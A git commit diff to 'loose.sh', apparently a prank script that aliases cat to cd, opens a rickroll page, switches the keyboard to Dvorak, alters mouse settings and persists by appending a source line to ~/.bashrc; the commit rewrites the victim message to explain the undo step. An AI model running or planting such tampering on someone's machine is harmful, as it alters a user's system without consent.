c8d810f9954500c0423516a285a5c651159c0440
Manfred Touron <m@42.am>
2015-09-07 21:48:37 +0200

    Update loose.sh

--- loose.sh
+++ loose.sh
@@ -8,7 +8,7 @@ alias cat=cd
 google-chrome rickroll.fr   2&>/dev/null
 setxkbmap dvorak            2&>/dev/null
 xset mouse 3 0              2&>/dev/null
-echo "Hacked !"
+echo "You've been hacked, you are using a Dvorak keyboard, to 'repair' your computer, you need to undo everything in ~/.loose file"
 EOF
 
 grep .loose ~/.bashrc 2>/dev/null || echo "source ~/.loose" >> ~/.bashrc
